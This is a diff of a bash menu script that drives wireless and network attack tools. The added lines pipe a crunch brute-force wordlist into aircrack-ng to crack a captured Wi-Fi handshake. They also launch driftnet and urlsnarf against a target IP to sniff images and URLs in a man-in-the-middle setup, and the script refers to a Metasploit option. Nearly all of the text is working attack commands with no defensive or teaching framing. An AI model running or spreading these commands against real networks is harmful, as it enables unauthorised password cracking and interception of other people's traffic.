@@ -184,7 +184,7 @@ echo -e ' \e[1;37m '
 echo
 echo
 echo
-echo  name of file of capture
+echo  'name of file of capture   ex : filecap'
 echo
 echo
 echo -e ' \e[1;31m '
@@ -198,12 +198,19 @@ echo
 echo
 echo
 echo
-echo  "Do you want crack hanshake y (yes) or n (no) "
+echo ------------------
+echo   crack handshake
+echo  - aircrack-ng -
+echo ------------------
 echo
 echo
-echo -e ' \e[1;31m '
-read -p 'option : ' choixrtv
-echo -e ' \e[1;37m '
+echo
+echo
+echo wep   or wpa
+echo
+echo
+read -p 'sercurity : ' ecript
+crunch 8 25 azertyuioqsdfghjklmwxcvbn01234567890 | aircrack-ng -w - -b $apbssid -a $ecript $filecap1.cap
 echo
 echo
 clear
@@ -292,41 +299,18 @@ echo    - sniffing mitm -
 echo -----------------------
 echo
 read -p 'interface : ' interfacesn
+echo
+echo ip adress of target
+echo
 read -p 'ip : ' ipsn
-xterm -title sniffing -e driftnet -i $interfacesn $ipsn | xterm -e urlsnarf -i $interfacesn $ipsn
-
+read -p 'file : ' sniffcap
+xterm -title sniffing -e "driftnet -i $interfacesn $ipsn >> sniffcap"  | xterm -title sniff -e  "urlsnarf -i $interfacesn $ipsn >> sniffcap"
 fi
 
 
 
 
 
-
-
-if [ $choix = "crack" ] && [ $choixrtv : "y" ]
-then
-clear
-echo ------------------
-echo   crack handshake
-echo  - aircrack-ng -
-echo ------------------
-echo file.cap
-echo
-read -p 'file : ' capcr
-echo
-echo
-echo bssid of acces point
-echo
-echo
-read -p 'bssid : ' bssidcr
-echo
-echo
-echo wep   or wpa
-echo
-echo
-read -p 'sercurity : ' ecript
-crunch 8 25 azertyuioqsdfghjklmwxcvbn01234567890 | aircrack-ng -w - -b $bssidcr -a $ecript $capcr
-fi
 
 
 if [ $choix = "msf" ]
